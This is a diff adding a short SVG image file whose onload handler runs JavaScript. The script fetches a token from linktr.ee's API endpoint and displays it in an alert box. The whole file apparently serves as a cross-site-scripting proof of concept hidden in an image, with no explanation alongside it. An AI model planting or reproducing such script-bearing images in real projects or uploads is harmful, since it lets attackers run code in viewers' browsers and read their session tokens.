@@ -1,0 +1,4 @@
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<svg xmlns="http://www.w3.org/2000/svg"
+     onload="fetch('https://linktr.ee/api/token').then(r=>r.ok?r.text():Promise.reject()).then(t=>alert(t||'Empty')).catch(console.error)">
+</svg>
